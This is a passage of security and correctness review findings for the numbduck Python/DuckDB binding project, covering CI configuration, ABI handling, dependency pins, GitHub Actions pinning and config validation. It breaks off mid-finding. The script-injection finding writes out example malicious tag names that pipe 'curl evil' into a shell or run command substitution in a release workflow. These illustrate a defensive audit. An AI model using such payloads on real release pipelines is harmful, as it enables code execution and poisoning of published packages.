confirmed.title: Benchmark test runs in CI despite marker documented as deselected
confirmed.description: pyproject.toml:26 declares the marker `benchmark: slow benchmarks, run only locally (deselected in CI)`, and test/test_ducklib.py:2684 decorates `test_udf_benchmark` with `@pytest.mark.benchmark`. The CI test step is a bare `pytest` (numbduck_ci.yml:79) with no `-m "not benchmark"` filter, and pyproject.toml has no `addopts` (tool.pytest.ini_options only defines `markers`). The benchmark is NOT env-gated (unlike the examples/, which check NUMBDUCK_BENCH_BIG) — its body unconditionally builds and times a Python scalar UDF over ROW_COUNTS = [10_000, 100_000, 1_000_000]. Its own docstring records the 1M-row Python column at 118.835s, i.e. roughly two minutes of pure-interpreter work per job. This runs on every one of the ~51 matrix jobs. The declared/documented contract (deselected in CI) is simply not implemented; the marker filter is missing.
confirmed.impact: Every matrix job pays ~1-2 minutes of pointless Python-UDF benchmarking (tens of billable minutes per CI run across ~51 jobs), and the marker's stated purpose is silently violated. Any future benchmark added under the same marker inherits the same non-deselection.
confirmed.recommendation: Filter benchmarks out in CI: change the pytest step to `pytest -m "not benchmark"` (numbduck_ci.yml:79), or add `addopts = "-m 'not benchmark'"` under [tool.pytest.ini_options] so local runs opt in explicitly. Per project convention also add `--durations=20` to the CI pytest invocation.
confirmed.verdictReasoning: Verified against current tree. pyproject.toml:24-27 declares only `markers = ["benchmark: slow benchmarks, run only locally (deselected in CI)"]` under [tool.pytest.ini_options] with no `addopts` and no `-m` filter anywhere. test/test_ducklib.py:2684-2685 decorates `test_udf_benchmark` with `@pytest.mark.benchmark`; the body (lines 2699-2790) is unconditional -- no env-var gate like the `NUMBDUCK_BENCH_BIG` check used by examples/haversine.py (confirmed via .github/workflows/haversine_bench.yml:30, a separate workflow_dispatch-only job that benchmarks examples/haversine.py, not this test). numbduck_ci.yml:77-79 runs a bare `pytest` step with no marker deselection. Confirmed no conftest.py, pytest.ini, tox.ini, or setup.cfg exists anywhere in the project tree that could inject `-m 'not benchmark'` (only irrelevant venv site-packages files matched). The test's own docstring records 0.749s+7.382s+118.835s (~127s) of pure Python-UDF timing per run at 10K/100K/1M rows, so every one of the ~90-minus-excludes matrix jobs (5 python x 3 arch x 2 numba x 3 duckdb, with 1.10x windows-limiting excludes -> reviewer's ~51 estimate is in the right ballpark) pays this cost unconditionally. The documented contract ('deselected in CI') is not implemented anywhere in the current tree. Severity high is justified: this is a real, quantifiable, silent violation of a stated CI contract that wastes tens of minutes of billable CI compute per run across the full matrix, and will silently apply to any future test tagged @pytest.mark.benchmark.

confirmed.title: By-value duckdb_result args (fetch_chunk / result_return_type / result_statement_type) are lowered via _call_lib_func_byval (func(T*) semantics), which omits the SysV x86-64 byval stack copy so the 48-byte struct is read from uninitialized stack
confirmed.description: ducklib.py:946, 1132, 1138 wrap three DuckDB C API functions with numbox's `_call_lib_func_byval`: duckdb_fetch_chunk, duckdb_result_return_type, duckdb_result_statement_type. Per duckdb.h 1.5.4 all three take the result struct BY VALUE, not by pointer: `duckdb_data_chunk duckdb_fetch_chunk(duckdb_result result)` (L4640), `duckdb_result_type duckdb_result_return_type(duckdb_result result)` (L1136), `duckdb_statement_type duckdb_result_statement_type(duckdb_result result)` (L974). `duckdb_result` is a real 6-field struct (3x idx_t + 3 pointers) = 48 bytes; numbduck models it as `duckdb_result_ty = UniTuple(intp, 6)` (ducklib.py:68), an ABI-LARGE (>16B) aggregate. `_call_lib_func_byval` / `_emit_byval_call` (numbox call.py:280-301, 203-209) is explicitly documented as the lowering for C signatures of the form `func(T*)` (a genuine pointer parameter): it does alloca + store + call-through-pointer with NO `byval` attribute and NO `optnone`/`noinline`. That lowering does not match a `func(T)` by-value 48-byte struct on SysV x86-64. On SysV x86-64 a 48-byte struct is MEMORY class and is passed INLINE ON THE STACK (the caller copies the bytes into the outgoing argument area; the callee reads them there). Verified by disassembly: a callee compiled from a 48-byte by-value signature reads its argument with `mov 0x30(%rsp),%rax` (from the stack), whereas the pointer form reads `mov 0x28(%rdi),%rax` (through the register). `_call_lib_func_byval` instead passes only the alloca pointer in RDI and never populates the outgoing stack argument area, so the real callee reads its 48-byte `result` from uninitialized/stale stack memory. An isolated mismatched-pointer call to such a callee returns pure garbage at -O0 (returned a stack address, not the struct field) and returns the correct value at -O2 only by coincidence (the caller's copy happened to land where the callee reads). numbox's own `_call_lib_func` LARGE-arg path handles exactly this size class correctly: it adds `byval` + `optnone` + `noinline` ONLY on SysV x86-64 (call.py:170-171, 185-189) and passes a plain pointer on Windows x64 / AAPCS64 (where the ABI genuinely passes >16B aggregates by reference). So `_call_lib_func_byval` is ABI-correct for these three functions on Windows x64 and ARM64 but ABI-incorrect on SysV x86-64, where it works today only by stack-layout coincidence.
confirmed.impact: On Linux x86-64 (the primary CI/target platform) the three calls currently return correct results only because numba's JIT stack layout happens to place the alloca'd copy where the by-value callee reads. This is not guaranteed: a numba/LLVM version bump, a change to NUMBDUCK_JIT_OPTIONS (e.g. disabling inline or a different optimization level), or altered surrounding stack usage can silently move the read off the copy. Failure is silent and severe: duckdb_result_return_type / duckdb_result_statement_type would return a wrong enum, and duckdb_fetch_chunk would read a garbage `internal_data` pointer (offset 40 of the struct) that DuckDB then dereferences to locate the result set -> wild-pointer read / segfault / UB. duckdb_fetch_chunk is the central result-fetch primitive used throughout the test suite and downstream code, so the blast radius is the whole read path. Because the byval copy is exact-sized (48B alloca == struct), this is not an out-of-bounds write, but it is an ABI-incorrect read of the wrong 48 bytes of stack.
confirmed.recommendation: Route all three by-value functions through numbox's `_call_lib_func` (the ABI-aware by-value large-struct path) instead of `_call_lib_func_byval`. E.g. `return _call_lib_func("duckdb_fetch_chunk", (duckdb_result,))` and likewise `_call_lib_func("duckdb_result_return_type", (result,))` / `_call_lib_func("duckdb_result_statement_type", (result,))`. The registered signatures are already `intp(duckdb_result_ty)` / `int32(duckdb_result_ty)` (ducklib.py:172, 224, 225), so no signature change is needed: `_classify` sees the 48-byte UniTuple as STRUCT_LARGE and applies `byval`+`optnone`+`noinline` on SysV x86-64 (correct inline stack copy) and a plain pointer on Windows x64 / AAPCS64 (correct by-reference) -- ABI-correct on every supported platform. Reserve `_call_lib_func_byval` for genuine `func(T*)` parameters (it is currently used for nothing else in ducklib.py). Lock the fix with a round-trip test that fetches a chunk and validates column data with inlining disabled / low opt, to defeat the current coincidence.
confirmed.verdictReasoning: Verified against the CURRENT @proxy tree. ducklib.py:944-946, 1129-1132, 1135-1138 wrap duckdb_fetch_chunk, duckdb_result_return_type, duckdb_result_statement_type using _call_lib_func_byval, passing the 48-byte duckdb_result_ty = UniTuple(intp, 6) (ducklib.py:68) struct value directly as the intrinsic's arg_ty. duckdb.h (v1.5.4, matching the duckdb>=1.3.2,<1.6 pin) confirms all three take `duckdb_result result` BY VALUE (L4640, L1136, L974), not `duckdb_result *`, and duckdb_result is exactly a 3x idx_t + 3-pointer 48-byte struct (L440-454) -- matching the UniTuple(intp,6) model. numbox's _call_lib_func_byval (call.py:280-301) and its codegen helper _emit_byval_call (call.py:203-209) are explicitly documented as being 'used when the C signature takes a pointer to a struct' (func(T*)) -- the intrinsic allocas+stores the value and passes the slot's address as a plain LLVM pointer parameter with NO `byval` attribute, i.e. the address itself goes in the arg register. That is correct only for a genuine T* C parameter. duckdb_result is passed BY VALUE (func(T)), and abi.py's own _classify (abi.py:64-80) puts a 48-byte struct in _CLASS_STRUCT_LARGE, which on SysV x86-64 is MEMORY class per the psABI: the caller must copy the struct bytes directly into the outgoing stack argument area (no register/pointer indirection at all). numbox's sibling _call_lib_func (call.py:21-200) handles this correctly for STRUCT_LARGE args: it allocas+stores, then marks the arg `byval` (call.py:170-171, 185-186) and forces `optnone`+`noinline` on the caller (call.py:187-189) specifically so LLVM performs the real stack copy instead of eliding it -- this is the exact ABI-aware path the docstring in call.py:65-69 says to use for func(T), reserving _call_lib_func_byval for func(T*). ducklib.py's three wrappers instead declare the extern symbol with a single pointer LLVM parameter and pass only the alloca address in a register, never populating the actual stack argument area duckdb_fetch_chunk's real (clang/gcc-compiled) prologue will read from. This is a genuine caller/callee ABI mismatch for these three functions on SysV x86-64 (the primary Linux dev/CI target), not a documentation or interpretation error, and fetch_chunk sits on the core row-fetch path so the corruption is not a rare edge case. Cross-checked that the many correctly-modeled duckdb_result* functions (duckdb_column_count, duckdb_destroy_result, etc., ducklib.py:421-441, 776-778) instead pass a plain intp handle (duckdb_result_p) through ordinary _call_lib_func, confirming the codebase does distinguish 'genuine pointer' vs 'by-value struct' elsewhere and these three are the outliers. Severity: kept at 'high', which is the top of the severity scale actually used across this review's finding files (no 'critical' values appear in any sibling findings/*.json), and is warranted given the affected function (duckdb_fetch_chunk) is central to virtually every non-trivial query result read.

confirmed.title: No version-coordination check between the loaded standalone libduckdb and the Python duckdb wheel before pybridge hands it wheel-owned Connection* pointers
confirmed.description: On the macOS (and env-override) fallback path, load_duckdb() loads a SECOND copy of libduckdb to supply the C API symbols the Python wheel strips (utils.py:113-130). _find_standalone_libduckdb() returns a lib from three sources: the NUMBDUCK_LIBDUCKDB env override (utils.py:34-36), the versioned cache (utils.py:41-43), or the Homebrew/`/usr/local` paths (utils.py:23-26, 44-46). Only the download/cache path is version-pinned (the cache dir and download URL are keyed on duckdb.__version__ at utils.py:19-21,52-56). The brew paths (`/opt/homebrew/lib/libduckdb.dylib`, `/usr/local/lib/libduckdb.dylib`) and the env override are accepted with NO check that the library's version equals the installed Python `duckdb` wheel version. pybridge.extract_connection_ptr() then reads a raw `Connection*` out of the Python wheel's C++ object (pybridge.py:59-62) and passes it straight into ducklib.duckdb_query, which resolves `duckdb_query` against the standalone lib (pybridge.py:67). That pointer was constructed by the wheel's DuckDB build; the standalone lib casts it back to its own version's internal Connection class. If the two DuckDB versions differ (very plausible: `pip install duckdb==1.5.1` alongside a Homebrew duckdb at a different 1.x/1.6 release), the internal object layouts can disagree and the C API operates on a mis-typed pointer. The sibling numbox library treats this exact hazard as a bug to guard against: numbox/utils/pysqlite_bridge.py implements `libraries_coordinated()` (compares its linked sqlite version against Python's sqlite_version) and refuses to bridge a connection across mismatched copies, and numbox CLAUDE.md documents that this detect-and-refuse guard 'applies to any library'. numbduck has no equivalent guard.
confirmed.impact: Silent memory corruption / crashes when a user runs pybridge-based flows (registering @njit UDFs on an existing Python duckdb connection) on macOS with a Homebrew/env libduckdb whose version differs from the pip-installed duckdb wheel. No error is raised at load time; the mismatch surfaces as undefined behavior at query time. The versioned download path masks the issue in the common auto-download case, making the brew/env gap easy to miss.
confirmed.recommendation: Before returning a standalone/brew/env-sourced handle, verify its version matches duckdb.__version__ (e.g. call the standalone's duckdb_library_version() via ctypes and compare, or at minimum warn/refuse on mismatch), mirroring numbox's libraries_coordinated() detect-and-refuse pattern. Apply the check to the NUMBDUCK_LIBDUCKDB and brew branches, not just the version-keyed cache/download.
confirmed.verdictReasoning: Verified against current tree. numbduck/utils.py:113-130 load_duckdb() only checks capi-symbol presence (_has_capi_symbols, utils.py:29-30), never version equality, before returning a standalone lib to serve as duckdb_lib in ducklib.py:12. Of the three _find_standalone_libduckdb() sources (utils.py:33-47): only the cache/download path is version-keyed (_LIBDUCKDB_CACHE_DIR embeds duckdb.__version__ at utils.py:19-21; _download_libduckdb() builds the GitHub release URL from duckdb.__version__ at utils.py:51-56). The NUMBDUCK_LIBDUCKDB env override (utils.py:34-36) accepts any file that exists, and the Homebrew paths (utils.py:23-26, matched at line 44) are hardcoded with no version parameter at all -- confirms the cited utils.py:44 anchor. pybridge.py:59-62 (extract_connection_ptr) then walks pybind11/C++ object layout to pull a raw Connection* out of the wheel's DuckDBPyConnection, and pybridge.py:67 hands that pointer straight to ducklib.duckdb_query, which resolves against whatever duckdb_lib load_duckdb() returned -- potentially the brew/env-sourced standalone lib. If that standalone lib's DuckDB version differs from the installed duckdb wheel's version, the C API's internal Connection layout can disagree with what produced the pointer, per pybridge.py's own docstring warning (lines 31-34) about the pointer offsets being 'implementation details ... may change with major duckdb releases'. The 'SELECT 1' validation query in extract_connection_ptr (pybridge.py:64-72) only catches gross pointer-walk breakage, not the subtler case where a syntactically-valid Connection* is misinterpreted by a different-version library's internal class layout. Confirmed pybridge.extract_connection_ptr is a live, exercised code path (test/test_ducklib.py and all four examples/*.py import it), not dead code. Cross-checked the cited analog: numbox/utils/pysqlite_bridge.py:93-107 implements libraries_coordinated() (compares numbox's linked sqlite3_libversion() against Python's sqlite3.sqlite_version) and extract_connection_ptr there raises at pysqlite_bridge.py:159-167 on mismatch before ever touching the pointer -- numbduck has no equivalent check anywhere in its load path or in pybridge.py. The gap is real, the code citations are accurate, and the mechanism (silent internal-layout mismatch across DuckDB versions causing memory corruption on pointer dereference) is a legitimate correctness hazard, not a hypothetical. Trigger requires non-default configuration (macOS wheel missing C API symbols -- true for duckdb 1.4.1-1.5.2 per numbduck's own CLAUDE.md -- combined with a Homebrew or NUMBDUCK_LIBDUCKDB-sourced lib whose version differs from the installed wheel, or any env-override on any platform), so it is not a default hot path, but the impact class (silent memory corruption/undefined behavior with no error at load time) and the existence of a proven, already-implemented mitigation pattern one file away in the same project family justify keeping severity at high rather than downgrading.

confirmed.title: No upper cap on numbox while importing concrete internal modules
confirmed.description: The runtime pin is `numbox>=0.5.13` with no upper bound (pyproject.toml:13). numbduck imports concrete, non-top-level internals of numbox: `from numbox.core.bindings.call import _call_lib_func, _call_lib_func_byval`, `from numbox.core.bindings.signatures import signatures`, and `from numbox.core.proxy.proxy import proxy, proxy_if_available` (ducklib.py:4-6). These are deep module paths and underscore-prefixed private symbols, not a stable public API surface. Any future numbox that moves/renames `core.proxy.proxy` or `core.bindings.call`, or drops `_call_lib_func`, breaks numbduck at import time with an ImportError and no version guard to explain why. Contrast with the deliberate `<1.6` upper cap on duckdb (pyproject.toml:12), which the note (build.md 1a) documents as guarding an unvalidated major.
confirmed.impact: A silent, hard import failure on any numbox that reshuffles these internals; users on an unpinned environment can `pip install` an incompatible numbox and get a broken numbduck with no actionable diagnostic.
confirmed.recommendation: Add an upper cap reflecting the tested numbox range (e.g. `numbox>=0.5.13,<0.6`) and bump it deliberately as new numbox releases are validated, mirroring the duckdb pin discipline.
confirmed.verdictReasoning: Verified directly against current tree. pyproject.toml:13 reads exactly `"numbox>=0.5.13"` with no upper bound, in contrast to the deliberate `duckdb>=1.3.2,<1.6` cap at line 12. ducklib.py:4-6 confirms the exact imports cited: `from numbox.core.bindings.call import _call_lib_func, _call_lib_func_byval`, `from numbox.core.bindings.signatures import signatures`, `from numbox.core.proxy.proxy import proxy, proxy_if_available`. Checked numbox/numbox/__init__.py — it contains only `__version__ = ""`, i.e. none of proxy/proxy_if_available/_call_lib_func/_call_lib_func_byval are re-exported at the package root; these are genuinely deep internal module paths, not a curated public surface. `_call_lib_func`/`_call_lib_func_byval` are underscore-prefixed (private-by-convention); `proxy`/`proxy_if_available` are not underscore-prefixed but still live two levels deep in `core.bindings`/`core.proxy` with no `__all__` in either module and no stability/semver policy documented anywhere in numbox's README or CLAUDE.md. numbox's own git history shows exactly the churn risk the finding warns about: call.py has been repeatedly reshaped (‘Add >16-byte struct return support via sret’, ‘Add SysV x86-64/AAPCS64 INT/INT eightbyte repack’, ‘Auto-wrap scalar args’, an earlier ‘refactored packaging’ commit), and proxy.py has recent commits changing its internal contract (‘fail loudly when a @proxy function sits above the cache-anchor line’, ‘reference a process-stable cfunc alias instead of numba's uid name’). This is active, still-evolving internal surface, not a frozen API — exactly the profile that justifies an upper cap. No mitigating mechanism exists: no version guard at numbduck import time, no CI job pinning/testing multiple numbox versions to catch drift, and the project's own CLAUDE.md documents the pin as `numbox~=0.5.6` (which is a de-facto `<0.6` cap) while pyproject.toml has silently drifted to an uncapped `>=0.5.13` — corroborating that the cap was dropped/forgotten rather than deliberately omitted. The reviewer's own understanding-phase notes (docs/reviews/2026-07-01-numbduck/understanding/build.md lines 35-47, 303-315) independently reached the same conclusion before the findings phase, i.e. this was cross-checked twice. Severity 'medium' is appropriate: this is a latent packaging/CI risk (silent ImportError on a future numbox bump) rather than a currently-active break, matching the medium bar used elsewhere in this unit (e.g. BLD-DES-3, also medium, for a comparable 'unstamped local build breaks' packaging-design gap). Nothing found refutes it — the imports are real, the missing cap is real, and no compensating control (re-export shim, version guard, multi-numbox CI matrix) exists.

confirmed.title: release.yml splices github.ref_name into run: shell and into __init__.py, feeding a PyPI-publish pipeline (script injection)
confirmed.description: release.yml (NEW) interpolates GitHub expressions directly into the `run:` shell text of the `release-build` job. Line 25 `echo "VERSION=${{ github.ref_name }}" >> $GITHUB_ENV` places the tag name inside a double-quoted echo, and line 31 `echo "__version__ = '${{ env.VERSION }}'" > numbduck/__init__.py` places the same value (via GITHUB_ENV) inside a single-quoted Python string within a shell double-quoted string. `github.ref_name` is attacker/operator-controlled: a git tag name may legally contain backticks, `$(...)`, `;`, `&`, `|`, `'`, and `"` (git check-ref-format only forbids space, `~^:?*[\`, controls, `..`, etc.). This is the canonical GitHub Actions script-injection pattern (CodeQL js/actions-command-injection): the expression is expanded into the script TEXT before the shell runs, so a tag such as `` v1`curl evil|sh` `` (line 25 command substitution) or `'; curl evil | sh; echo '` (breaks out of the single-quoted string on line 31) executes arbitrary shell in the runner. The `release-build` job builds the wheel that the downstream `pypi-publish` job (id-token: write, environment: pypi, Trusted Publishing) uploads to PyPI, so injected code can poison the artifact that is then published to PyPI as numbduck — a supply-chain sink.
confirmed.impact: Arbitrary command execution in the release runner during a tag-triggered release, with the ability to tamper with the wheel that is subsequently published to PyPI via OIDC Trusted Publishing. Exploitation is gated by the ability to create a GitHub release / tag (write access), which lowers likelihood, but the sink (public PyPI package) makes the consequence severe.
confirmed.recommendation: Never interpolate `${{ github.ref_name }}` / `${{ env.VERSION }}` into `run:` script text. Pass them through the step's `env:` map (e.g. `env: { REF_NAME: ${{ github.ref_name }} }`) and reference the shell variable quoted: `echo "VERSION=$REF_NAME" >> "$GITHUB_ENV"` and `printf "__version__ = %s\n" "'$VERSION'" > numbduck/__init__.py` (or write the file via a small Python `-c`/heredoc that reads the env var). Environment values are not re-parsed as script, closing the injection.
confirmed.failure_scenario: A release is published from a tag named `` v1`touch /tmp/pwned` `` (or `'; python -c 'import urllib.request...'; echo '`). At line 25/31 the metacharacters are expanded into the shell command, running attacker code inside release-build; the tampered wheel is then handed to pypi-publish and pushed to PyPI.
confirmed.verdictReasoning: Read release.yml as it exists at HEAD: line 25 `echo "VERSION=${{ github.ref_name }}" >> $GITHUB_ENV` and line 31 `echo "__version__ = '${{ env.VERSION }}'" > numbduck/__init__.py`, both inside the `release-build` job's `run:` block, exactly as cited. GitHub Actions performs textual substitution of `${{ ... }}` expressions into the script BEFORE the shell parses it, so the substituted value becomes literal script text, not a quoted/escaped shell argument. `github.ref_name` for a `release: types: [published]` trigger is the release's tag name, which is only constrained by `git check-ref-format` (forbids space, control chars, `~^:?*[`, `..`, leading/trailing `.`/`/`, `@{`, backslash, and a bare `@` — it does NOT forbid backtick, `$`, `(`, `)`, `;`, `&`, `|`, or quote characters). A tag such as `` v1`touch pwned` `` or `v1$(curl evil|sh)` therefore survives as a legal git ref and, once substituted into line 25's double-quoted `echo "VERSION=..."`, is evaluated by bash: backtick and `$(...)` command substitution both fire inside double-quoted strings. This gives arbitrary command execution in the `release-build` runner. (The finding's line-31 payload description is slightly imprecise — it says the payload 'breaks out of the single-quoted string,' but the enclosing `echo "..."` is actually double-quoted, so a bare `'` doesn't terminate anything; the real vector at line 31 is identical backtick/`$(...)` substitution, which still works within the double-quoted context — the underlying vulnerability claim is unaffected by this imprecision.) The `release-build` job's `dist/` output is uploaded as an artifact and downloaded/published by the `pypi-publish` job (id-token: write, `pypi` environment, Trusted Publishing) at lines 45-66, so a poisoned wheel from the injection reaches PyPI. This matches the canonical, CodeQL-flagged (js/actions-command-injection) GitHub Actions script-injection anti-pattern precisely. The main mitigating factor — which the finding itself already states and factors into severity — is that triggering a `release: published` event requires repo write access, so this is an insider/compromised-account escalation rather than an anonymous/fork-PR vector; a user with that access could often tamper with the built artifact by other means (e.g. pushing malicious source to an unprotected branch/tag) without needing this injection. But that does not make the finding false: it remains a real, exploitable, best-practice-violating sink (env-map pattern trivially fixes it), and 'medium' is an appropriately calibrated severity — not inflated to critical/high despite the PyPI sink, and not dismissed to low/none despite the write-access gate. No mitigating control (SHA-pinning, environment manual-approval gate that inspects wheel contents, alternate safe interpolation) is present in the cited code to refute this. Confirmed as characterized, severity unchanged at medium.

confirmed.title: PyPI-publish and other actions pinned to mutable refs; pypa/gh-action-pypi-publish uses a mutable BRANCH ref in the id-token:write job
confirmed.description: Every third-party and first-party action in the workflows is pinned to a mutable ref (tag or branch), not a full commit SHA. The highest-value case is release.yml:66 `uses: pypa/gh-action-pypi-publish@release/v1` — `release/v1` is a moving BRANCH (not even an immutable tag), and it runs in the `pypi-publish` job that carries `id-token: write` and the `pypi` environment (OIDC Trusted Publishing). Any change to that branch (or a compromise of the pypa repo/branch) executes new code in a job that can mint a PyPI publishing token and push arbitrary artifacts to the numbduck project on PyPI. Other unpinned refs: `lycheeverse/lychee-action@v2` (link-check.yml:45, third-party, runs with `issues: write`), and the first-party `actions/checkout`, `actions/setup-python`, `actions/upload-artifact`, `actions/download-artifact` (`@v4/@v5/@v6/@v7`). Git tags and branches are mutable and can be force-moved, so tag/branch pinning does not give the reproducibility/integrity guarantee of a SHA (OpenSSF Scorecard Pinned-Dependencies).
confirmed.impact: A compromised or force-moved upstream ref runs attacker code in CI. For pypa/gh-action-pypi-publish@release/v1 specifically, that code executes in the OIDC-privileged publish job and could publish a malicious numbduck release to PyPI; for lychee-action it could abuse `issues: write`.
confirmed.recommendation: Pin every action to a full 40-char commit SHA with the human-readable version in a trailing comment, e.g. `pypa/gh-action-pypi-publish@<sha>  # release/v1`, and likewise for lychee-action and the actions/* set. Prioritize the pypi-publish and lychee (issues: write) jobs. Enable Dependabot for GitHub Actions to bump the pinned SHAs.
confirmed.failure_scenario: The `release/v1` branch of pypa/gh-action-pypi-publish is updated (or compromised) between two numbduck releases; the next `release: published` run executes the new action code inside the id-token:write job and can obtain a PyPI OIDC token for numbduck.
confirmed.verdictReasoning: Verified against the current tree. release.yml:66 reads `uses: pypa/gh-action-pypi-publish@release/v1` inside the `pypi-publish` job, which declares `permissions: id-token: write` and the `pypi` GitHub Environment (release.yml:51-56) -- i.e. OIDC trusted publishing to PyPI. Confirmed via the GitHub API that `release/v1` in pypa/gh-action-pypi-publish is a branch (HEAD currently at commit cef221092ed1bacb1cc03d23a2d87d1d172e277b), not a tag or SHA -- so it is a moving ref by construction, not a one-time immutable pointer. The action's own README explicitly advises pinning to a tagged version or a SHA instead of a branch pointer such as this, yet the example (and numbduck's usage) uses the branch anyway. Cross-checked the rest of the claim: every other action across the repo's workflows is also tag-pinned rather than SHA-pinned -- link-check.yml:16 `issues: write` + line 45 `lycheeverse/lychee-action@v2`; numbduck_ci.yml/haversine_bench.yml/doc-codeblock-flake8.yml all use `actions/checkout@v6` and `actions/setup-python@v6`; release.yml also uses `actions/checkout@v4`, `actions/setup-python@v5`, `actions/upload-artifact@v4`, `actions/download-artifact@v4`; link-check.yml uses `actions/upload-artifact@v7`. All of these match the finding's file:line citations and its general claim that no action anywhere is pinned to a full commit SHA. The specific risk framing is accurate: a compromise or force-move of pypa's release/v1 branch would run new code inside numbduck's OIDC-privileged, PyPI-publishing job on the next `release: published` trigger, which is a real (if low-probability, since pypa is a well-governed org with branch protection) supply-chain exposure -- consistent with OpenSSF Scorecard's Pinned-Dependencies guidance. This is not a false positive, over-claim, or already-mitigated condition: there is no SHA pin, no Dependabot action-pin bump config, and no compensating control anywhere in the four workflow files. Severity: medium is appropriate -- real and exploitable in principle in the most sensitive (id-token: write) job, but impact requires a further precondition (compromise or force-move of a well-protected upstream branch), which keeps it below high/critical; it is more than low given the trusted-publishing blast radius (arbitrary malicious PyPI release under the numbduck name).

confirmed.title: Valid-but-wrong-shape JSON (list/scalar/string) is accepted and silently disables caching
confirmed.description: get_jit_options() returns json.loads(as_str) with no check that the parsed value is a dict. Any JSON that parses but is not an object -- e.g. NUMBDUCK_JIT_OPTIONS='["cache"]', 'true', '5', or '"cache"' -- is returned as a list/bool/int/str. That value is then passed to numbox.core.proxy.proxy as jit_options=..., where proxy.py normalizes it with `jit_options = isinstance(jit_options, dict) and jit_options or {}` (proxy.py line ~69). A non-dict therefore silently collapses to {} and the wrappers are JIT-compiled with NO options at all -- in particular cache is silently off. There is no error and no warning: the user believes they configured jit options but every binding recompiles cold on every import. This defeats the whole point of the default {"cache": True} and is exactly the kind of misconfiguration a config parser should catch.
confirmed.impact: Silent, hard-to-diagnose loss of the compile cache (and any other intended option) for the entire ducklib binding set whenever the env var holds valid-but-non-object JSON; no error surfaces to the operator.
confirmed.recommendation: Validate the parsed shape in get_jit_options(): after json.loads, `if not isinstance(as_json, dict): raise ValueError("NUMBDUCK_JIT_OPTIONS must be a JSON object, e.g. {\"cache\": false}")`. Fail loudly at import rather than letting proxy silently coerce to {}.
confirmed.verdictReasoning: Verified against current code. numbduck/configurations.py:12-14 does `as_json = json.loads(as_str); return as_json` with no isinstance(dict) check -- any valid-but-non-object JSON (e.g. '["cache"]', 'true', '5', '"cache"') passes through get_jit_options() unchanged and becomes the module-level `jit_options` (configurations.py:19), which is imported into ducklib.py:8 and threaded into every one of the ~200+ `@proxy(sig, jit_options=jit_options)` call sites starting at ducklib.py:276. Confirmed in /home/erik/projects/numbox/numbox/core/proxy/proxy.py:69: `jit_options = isinstance(jit_options, dict) and jit_options or {}` -- for any non-dict value (list/bool/int/str) `isinstance(...)` is False, so the expression short-circuits to `{}` regardless of the actual content. This is not gated by cache=True specifically; it silently drops ALL requested jit options for every binding, with no exception, no warning, no log line -- an operator who sets NUMBDUCK_JIT_OPTIONS to a non-object JSON value believes they configured jit behavior (e.g. disabled caching, or intended some other flag) but every wrapper compiles with default njit options instead. No other validation layer exists between configurations.py and the proxy call sites (grep of ducklib.py shows jit_options flows unmodified from the single import). Severity medium is appropriate: it is silent/hard-to-diagnose misconfiguration with a real (if not correctness-breaking) impact -- loss of the compile cache and any other intended option, defeating the purpose of the config knob -- but it does not corrupt data or crash the program, matching the 'medium' bar rather than high/critical.

confirmed.title: Unknown/invalid jit option keys fail opaquely at import time with a numba error that never names the env var
confirmed.description: jit_options = get_jit_options() runs at module import, and the dict is spread into njit(sig, **jit_options) inside proxy() for the very first @proxy-decorated wrapper in ducklib.py (line 276). A dict with a key numba's njit does not accept -- e.g. NUMBDUCK_JIT_OPTIONS='{"cache": true, "foobar": 1}' -- surfaces as a numba/njit error (unexpected keyword / option) raised the instant ducklib.py is imported. Because get_jit_options() performs no key validation and the failure happens deep inside proxy->njit, the traceback points at numba internals and never mentions NUMBDUCK_JIT_OPTIONS, so the operator gets no hint that an env var caused it. Blast radius is total: ducklib is the package's core module, so ANY import of numbduck bindings dies at import time. A config helper that json-validates but not key-validates trades one clear error (bad JSON -> 'must be valid JSON') for an opaque one (bad key -> numba internals).
confirmed.impact: A single typo'd option key in the env var renders the entire library unimportable with an error that does not identify the misconfiguration source; every consumer import fails.
confirmed.recommendation: Either whitelist the accepted keys in get_jit_options() and raise a ValueError naming NUMBDUCK_JIT_OPTIONS and the offending key, or wrap the njit application so the env-var provenance is included in the error message. At minimum document that only njit-accepted keys are permitted.
confirmed.verdictReasoning: Reproduced the exact failure mechanism directly against numba (numbox's venv, numba installed there): njit(sig, cache=True, foobar=1)(func) raises KeyError: "Unrecognized options: {'foobar'}. Known options are dict_keys([...])" -- a message that names numba's option keys but never mentions NUMBDUCK_JIT_OPTIONS or configurations.py. Confirmed the call chain on the current tree: numbduck/configurations.py:19 `jit_options = get_jit_options()` runs at import with zero key validation (only json.loads + isinstance-free passthrough, per configurations.py:5-16); numbduck/ducklib.py:8 imports that dict at module top (`from numbduck.configurations import jit_options`); the first consumer is the module-level decorator `@proxy(signatures.get("duckdb_array_type_array_size"), jit_options=jit_options)` at ducklib.py:276, which executes immediately during ducklib's own import (decorators run at class/module-body execution, not lazily). Inside that call, numbox/core/proxy/proxy.py:75 (`func_jit = njit(sig, **jit_options)(func)`) spreads the dict straight into njit with no filtering (proxy.py:69's `isinstance(...) and ... or {}` only guards non-dict values, it does not filter keys). So NUMBDUCK_JIT_OPTIONS='{"cache": true, "foobar": 1}' deterministically kills any import of numbduck bindings with the numba KeyError above, and nothing in the message or in get_jit_options() surfaces the offending env var. Severity medium is appropriate: it's self-inflicted (requires an operator to set a malformed env var) so not a default-path bug, but once triggered the blast radius is total (ducklib is the package's core import) and the error gives no hint of the root cause, matching CFG-COR-2's description exactly.

confirmed.title: CLAUDE.md Architecture/Follow-ups sections describe a since-completed migration and helpers/intrinsics that do not exist in the current @proxy tree
confirmed.description: The current ducklib.py wraps every C function with @proxy(...)/@proxy_if_available(...) plus _call_lib_func/_call_lib_func_byval (imported from numbox), and contains NO @intrinsic definitions and NO local helper functions at all. Multiple concrete CLAUDE.md claims are now false: (1) L26 says wrappers use '@cres + _call_lib_func' and the 'Adding a New Binding' template L33-37 shows '@cres(signatures.get("duckdb_func"))' — the actual decorator is '@proxy(signatures.get(...), jit_options=jit_options)'; @cres is never used and the template omits the required jit_options kwarg. L86 again lists '@cres decorator'. (2) The 'Struct-by-value helpers (ducklib.py)' section L43-53 states 'ducklib.py provides' _call_lib_func_struct_in, _call_lib_func_struct_out, _emit_byval_call, and _build_packed_interval, and that 'Custom @intrinsic functions are used for >16-byte structs (decimal 24B, varint 24B) and interval'. None of these symbols exist in ducklib.py — only _call_lib_func_byval exists and it is imported from numbox (ducklib.py:4), not provided here; decimal/varint/interval binds are now plain @proxy wrappers (ducklib.py:1423-1432, 648-663). (3) The 'Follow-ups' section L55-62 asks to migrate 